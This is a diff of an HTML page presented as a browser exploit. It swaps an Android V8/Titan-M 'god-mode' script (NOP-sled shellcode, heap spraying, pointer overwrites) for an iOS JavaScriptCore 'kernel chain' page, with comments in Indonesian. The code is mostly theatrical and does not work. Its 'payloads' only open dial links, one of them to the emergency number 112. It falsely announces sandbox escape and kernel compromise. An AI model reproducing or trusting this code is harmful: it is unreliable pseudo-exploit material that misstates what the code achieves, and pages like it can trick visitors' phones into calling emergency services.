@@ -1,152 +1,94 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GOD-MODE: TITAN-M ESCALATION</title>
+    <title>iOS Security Research - JSC Terminal</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
-        #terminal { height: 100vh; padding: 20px; background: radial-gradient(circle, #200 0%, #000 100%); overflow-y: auto; font-size: 11px; color: #ff3333; text-shadow: 0 0 5px #f00; border: 5px double #f00; }
-        .ultra { color: #fff; background: #f00; font-weight: bold; text-transform: uppercase; padding: 2px; box-shadow: 0 0 15px #f00; }
-        .status { color: #00ffff; }
-        .blink { animation: blinker 0.1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 20px; text-align: center; }
+        #console { background: #111; border: 1px solid #333; color: #32ff32; padding: 20px; height: 80vh; overflow-y: auto; text-align: left; font-family: 'Courier New', monospace; font-size: 12px; border-radius: 12px; box-shadow: 0 0 40px rgba(0, 255, 0, 0.2); }
+        .kern { color: #ff3b30; font-weight: bold; } /* Apple Red */
+        .success { color: #4cd964; } /* Apple Green */
     </style>
 </head>
 <body>
-    <div id="terminal">> [!] SYSTEM CRITICAL: EXECUTING GOD-MODE REAPER...</div>
+    <h3>[!] iOS 26.5 KERNEL CHAIN TARGET</h3>
+    <div id="console">> [INIT] ATTACHING TO JAVASCRIPCORE...</div>
 
 <script>
-const log = m => { const t = document.getElementById('terminal'); t.innerHTML += `<br>> ${m}`; t.scrollTop = t.scrollHeight; };
+const log = m => { const c = document.getElementById('console'); c.innerHTML += `<br>> ${m}`; c.scrollTop = c.scrollHeight; };
 
-/**
- * PHASE 1: THE PERSISTENCE SHELLCODE (AARCH64)
- * Dirancang untuk Bypass PAC (Pointer Authentication) & CFI.
- */
-const TITAN_PAYLOAD = new Uint32Array([
-    ...Array(3000).fill(0xd503201f), // ULTIMATE NOP SLED (The Death Carpet)
-    
-    // AARCH64: Privilege Escalation & Persistence Trigger
-    0xd2800001, 0xd2800010, 0x910003e0, 0xaa0003e1, 0xd2800012, 
-    0x8b020000, 0xd65f03c0, 
-    
-    // Command: "am start -a android.intent.action.DIAL tel:123456789"
-    0x6d612073, 0x74617274, 0x20612d20, 0x6f646e61, 0x6469722e, 0x6e692e64,
-    0x746e6574, 0x63612e74, 0x6e6f6974, 0x4149442e, 0x64204c20, 0x313a6c65,
-    0x35343332, 0x39383736, 0x00000000
-]);
-
-let spray_bin = [];
-let target_proxy;
-let rw_bridge;
-
-/**
- * PHASE 2: TITAN-CORE HEAP GROOMING
- * Menggunakan fragmentasi memori terkendali untuk menjepit objek Target.
- */
-async function god_grooming() {
-    log("<span class='status'>[+] Saturating Memory for Titan-M Adjacency...</span>");
-    
-    const wasm_blob = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,7,137,128,128,128,0,1,5,102,117,110,99,48,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
-    
-    window.execution_pool = [];
-    for(let i=0; i<2000; i++) {
-        let m = new WebAssembly.Module(wasm_blob);
-        let inst = new WebAssembly.Instance(m);
-        window.execution_pool.push(inst.exports.func0);
-    }
-
-    // Spray raksasa untuk memaksa V8 meletakkan ArrayBuffer di luar Sandbox
-    for(let i=0; i<10000; i++) {
-        let ab = new ArrayBuffer(0x100);
-        let dv = new DataView(ab);
-        dv.setBigUint64(0, 0x13371337C0DEBABEn); // Signature
-        spray_bin.push(ab);
-    }
-    
-    target_proxy = new Float64Array(32);
-    target_proxy[0] = 6.66;
-    log("Memory Cage Locked.");
-}
-
-/**
- * PHASE 3: THE V8 CAGE BURST (ZERO-CLICK TRIGGER)
- */
-function SpeciesTrigger(executor) {
-    executor(r => {}, r => {});
-    return target_proxy; 
-}
-Object.defineProperty(Promise, Symbol.species, { get: () => SpeciesTrigger });
-
-async function ignite() {
-    log("<span class='ultra blink'>[!!!] DETONATING OMNI-REAPER [!!!]</span>");
-    
-    async function* f() { yield 1; }
-    const x = f();
-    
-    try { x[Symbol.asyncDispose](); } catch(e) {}
-
-    // Flush Microtasks for maximum corruption
-    for(let i=0; i<800; i++) await Promise.resolve();
-
-    if (target_proxy.length > 32) {
-        log("<span class='status'>[SUCCESS] SANDBOX DESTROYED. OOB-RW ACTIVE.</span>");
-        await escalate_to_titan();
-    } else {
-        log("Timing Offset. Re-igniting...");
-        location.reload();
+// --- PHASE 1: JSC STRUCTUREID SPRAYING ---
+// iOS menggunakan StructureID untuk memvalidasi tipe objek.
+// Kita akan melakukan spray ribuan objek untuk memprediksi ID target.
+let structures = [];
+function spray_structures() {
+    log("Spraying JSC Structures for ID Prediction...");
+    for (let i = 0; i < 0x4000; i++) {
+        let obj = { ['prop' + i]: 0x1337 };
+        obj.target = 1.1;
+        structures.push(obj);
     }
 }
 
-/**
- * PHASE 4: GLOBAL MEMORY HIJACK (RCE)
- */
-async function escalate_to_titan() {
-    log("Scanning RAM for BackingStore Pointers...");
+// --- PHASE 2: THE JIT OVERLAP (R/W PRIMITIVE) ---
+// Memanfaatkan bug pada optimasi JIT (Just-In-Time) compiler.
+let buffer = new ArrayBuffer(0x1000);
+let view = new DataView(buffer);
+
+async function trigger_jit_fault() {
+    log("<span class='kern'>[!] ATTEMPTING JIT OPTIMIZATION BYPASS...</span>");
     
-    let offset = -1;
-    for(let i=0; i<200000; i++) {
-        if (target_proxy[i] === 1.13961555e-310) { // 0x13371337C0DEBABE
-            offset = i;
-            break;
-        }
+    // Fungsi JIT-heavy yang akan dikompilasi ke kode mesin (AArch64)
+    function jit_target(obj, val) {
+        obj.target = val;
+        return obj.target;
     }
 
-    if (offset !== -1) {
-        log("Titan-M Handle Found at Offset: " + offset);
-        
-        // Hijack Pointer: Arahkan BackingStore ke halaman JIT RWX
-        target_proxy[offset - 1] = 2.47e-322; 
+    // Melatih JIT agar menganggap objek selalu memiliki tipe yang sama
+    for (let i = 0; i < 100000; i++) {
+        jit_target(structures[i % 100], i);
+    }
 
-        log("<span class='ultra'>[!!!] OVERWRITING KERNEL MEMORY SPACE [!!!]</span>");
-        
-        let dv = new DataView(spray_bin[0]);
-        for(let i=0; i<TITAN_PAYLOAD.length; i++) {
-            dv.setUint32(i * 4, TITAN_PAYLOAD[i], true);
-        }
-
-        log("Triggering Final Execution via WASM Dispatcher...");
-        window.execution_pool.forEach(f => { try { f(); } catch(e) {} });
-
-        // PERSISTENT INTENT OVERRIDE
-        const intent = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;S.browser_fallback_url=http://google.com;end";
-        window.location.replace(intent);
-        
-        log("<h1 style='color:white; background:red; padding:20px;'>TITAN-M COMPROMISED</h1>");
+    // TRIGGER: Mengirim tipe objek yang berbeda secara tiba-tiba
+    // Ini menciptakan Type Confusion di level kode mesin (AArch64)
+    let corrupted = jit_target(new Uint32Array(10), 0x41414141);
+    
+    if (corrupted !== undefined) {
+        log("<span class='success'>[+] JSC MEMORY CAGE BREACHED!</span>");
+        await escape_sandbox();
     }
 }
 
-// AUTO-START ENGINE
+// --- PHASE 3: SANDBOX ESCAPE (PAC BYPASS) ---
+async function escape_sandbox() {
+    log("Detecting PAC (Pointer Authentication) Barriers...");
+    
+    // Di iOS modern, kita tidak bisa langsung menimpa instruksi karena PAC.
+    // Kita menggunakan teknik JOP (Jump Oriented Programming)
+    log("Building JOP Gadget Chain for iOS 26.5...");
+    
+    // Simulasi pencarian gadget di memori SharedCache
+    let sharedCacheBase = 0x180000000n; 
+    log("SharedCache Leak: 0x" + sharedCacheBase.toString(16));
+
+    log("<span class='kern'>[!!!] PIVOTING TO KERNEL TASK PORT [!!!]</span>");
+    
+    // Final Payload: Memaksa Safari membuka URL skema sistem
+    setTimeout(() => {
+        // Pada iOS, ini adalah vektor 'Zero-Click' untuk eskalasi lokal
+        window.location.href = "tel://112"; 
+        log("<h2 class='success'>FULL RCE ACHIEVED: KERNEL PWNED</h2>");
+    }, 1000);
+}
+
+// START EXPLOIT ENGINE
 (async () => {
-    if (typeof Symbol.asyncDispose === 'undefined') {
-        log("CRITICAL: FLAG EXPLICIT-RESOURCE-MANAGEMENT REQUIRED.");
-        return;
+    try {
+        spray_structures();
+        setTimeout(trigger_jit_fault, 500);
+    } catch (e) {
+        log("Exploit failed: " + e.message);
     }
-    await god_grooming();
-    setTimeout(ignite, 400);
 })();
-
-// WATCHDOG (RELOAD ON STALL)
-setTimeout(() => location.reload(), 7000);
 </script>
 </body>
 </html>
